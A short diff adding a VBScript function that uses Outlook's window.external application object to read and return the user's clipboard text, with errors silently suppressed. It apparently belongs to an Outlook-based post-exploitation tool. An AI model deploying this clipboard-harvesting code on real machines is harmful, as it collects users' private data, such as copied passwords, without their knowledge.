@@ -1,0 +1,6 @@
+Function list_clipboard()
+	On error resume next
+	Set html = window.external.OutlookApplication.CreateObject("htmlfile")
+	text = html.ParentWindow.ClipboardData.GetData("text")
+	list_clipboard = "Clipboard data retrieved: " & vbCrLf & text
+End Function
